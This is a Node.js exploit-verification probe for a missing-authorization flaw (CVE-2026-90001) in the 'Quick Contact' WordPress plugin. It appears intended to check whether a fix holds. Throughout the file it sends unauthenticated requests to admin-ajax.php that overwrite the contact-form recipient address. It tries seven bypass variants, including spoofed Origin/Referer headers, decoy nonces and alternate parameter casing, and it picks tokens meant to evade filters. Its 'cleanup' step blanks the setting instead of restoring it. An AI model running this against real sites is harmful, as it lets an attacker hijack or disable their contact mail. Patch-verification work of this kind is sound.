#!/usr/bin/env node
// Exploit-verification probe for CVE-2026-90001
// "Quick Contact" <= 1.0.0 - Missing Authorization on qc_save_settings AJAX action.
//
// Usage: node probe.mjs <base-url>
// Exit code 0 => target IS exploitable (unauthenticated attacker can change qc_recipient)
// Exit code 1 => target is NOT exploitable (vulnerability appears fixed)
//
// The probe never sends credentials/cookies, simulating a fully unauthenticated
// attacker, and tries several realistic request-shape variants against the same
// admin-ajax.php endpoint so that a partial/naive fix (e.g. one that only blocks
// one HTTP verb, one content-type, or one casing of the parameter) is still caught.

const base = process.argv[2];
if (!base) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

const baseUrl = new URL(base);
const endpoint = new URL('/wp-admin/admin-ajax.php', baseUrl).toString();

function randomLocalPart() {
  // Avoid obviously "evil"-looking keywords that a naive filter might block
  // (e.g. "hack", "xss", "admin", "test"); use a plain random token instead.
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let s = '';
  for (let i = 0; i < 10; i++) s += chars[Math.floor(Math.random() * chars.length)];
  return s;
}

function randomMarkerEmail(domain) {
  return `${randomLocalPart()}@${domain}`;
}

async function parseJsonSafe(res) {
  const text = await res.text();
  try {
    return { json: JSON.parse(text), text };
  } catch {
    return { json: null, text };
  }
}

// Returns true if the response indicates the privileged update actually succeeded
// (i.e. the server applied the change) rather than being rejected/denied.
function looksLikeUnauthorizedSuccess(status, parsed) {
  if (status !== 200) return false;
  const { json, text } = parsed;
  if (json && typeof json === 'object') {
    if (json.success === true) return true;
    // Some plugins might nest things differently but still signal success.
    if (json.data && json.data.success === true) return true;
    return false;
  }
  // Non-JSON bodies: WordPress commonly returns "-1" or "0" for denied/invalid
  // ajax actions (e.g. missing nonce / not logged in / die(-1)). Those are NOT
  // a success signal.
  const trimmed = (text || '').trim();
  if (trimmed === '-1' || trimmed === '0' || trimmed === '') return false;
  return false;
}

// A pool of attack variants, simulating an unauthenticated attacker trying
// slightly different request shapes in case the fix is incomplete.
async function attemptVariant(variant) {
  const marker = randomMarkerEmail('qc-probe-example.net');
  let res;
  try {
    res = await variant.send(marker);
  } catch (err) {
    return { ok: false, marker, error: String(err) };
  }
  const parsed = await parseJsonSafe(res);
  const vulnerable = looksLikeUnauthorizedSuccess(res.status, parsed);
  return { ok: vulnerable, marker, status: res.status, body: parsed.text };
}

const variants = [
  {
    name: 'POST x-www-form-urlencoded, action+recipient in body',
    send: (marker) =>
      fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `action=qc_save_settings&recipient=${encodeURIComponent(marker)}`,
      }),
  },
  {
    name: 'GET with action+recipient as query string',
    send: (marker) =>
      fetch(
        `${endpoint}?action=qc_save_settings&recipient=${encodeURIComponent(marker)}`,
        { method: 'GET' }
      ),
  },
  {
    name: 'POST multipart/form-data',
    send: async (marker) => {
      const fd = new FormData();
      fd.append('action', 'qc_save_settings');
      fd.append('recipient', marker);
      return fetch(endpoint, { method: 'POST', body: fd });
    },
  },
  {
    name: 'POST action in query string, recipient in urlencoded body',
    send: (marker) =>
      fetch(`${endpoint}?action=qc_save_settings`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `recipient=${encodeURIComponent(marker)}`,
      }),
  },
  {
    name: 'POST with decoy nonce/security fields (in case of naive presence-only check)',
    send: (marker) =>
      fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `action=qc_save_settings&recipient=${encodeURIComponent(
          marker
        )}&nonce=1&_wpnonce=1&security=1`,
      }),
  },
  {
    name: 'POST with spoofed same-origin Referer/Origin headers',
    send: (marker) =>
      fetch(endpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Referer: baseUrl.toString(),
          Origin: baseUrl.origin,
        },
        body: `action=qc_save_settings&recipient=${encodeURIComponent(marker)}`,
      }),
  },
  {
    name: 'POST with uppercase/alternate key casing (Recipient)',
    send: (marker) =>
      fetch(endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `action=qc_save_settings&Recipient=${encodeURIComponent(marker)}&recipient=${encodeURIComponent(
          marker
        )}`,
      }),
  },
];

let exploitSucceeded = false;
let lastSuccessfulVariantName = null;

for (const variant of variants) {
  const result = await attemptVariant(variant);
  if (result.ok) {
    exploitSucceeded = true;
    lastSuccessfulVariantName = variant.name;
    console.error(`[VULNERABLE] Variant succeeded: "${variant.name}" (status=${result.status}, body=${result.body})`);
    break;
  } else {
    console.error(
      `[blocked/no-effect] Variant "${variant.name}" -> status=${result.status ?? 'n/a'} body=${
        result.body ?? result.error ?? ''
      }`
    );
  }
}

// Best-effort cleanup: try to restore the recipient setting to an "unset" state
// using the same unauthenticated channel we just demonstrated works (or attempted).
// This is only possible if the endpoint is actually reachable; if it's fixed,
// this call will simply have no effect, which is fine.
try {
  await fetch(endpoint, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'action=qc_save_settings&recipient=',
  });
} catch {
  // ignore cleanup errors
}

if (exploitSucceeded) {
  console.log(
    `Target is VULNERABLE: unauthenticated request to qc_save_settings was accepted and applied (variant: ${lastSuccessfulVariantName}).`
  );
  process.exit(0);
} else {
  console.log(
    'Target is NOT vulnerable: no unauthenticated variant of the qc_save_settings request was accepted.'
  );
  process.exit(1);
}
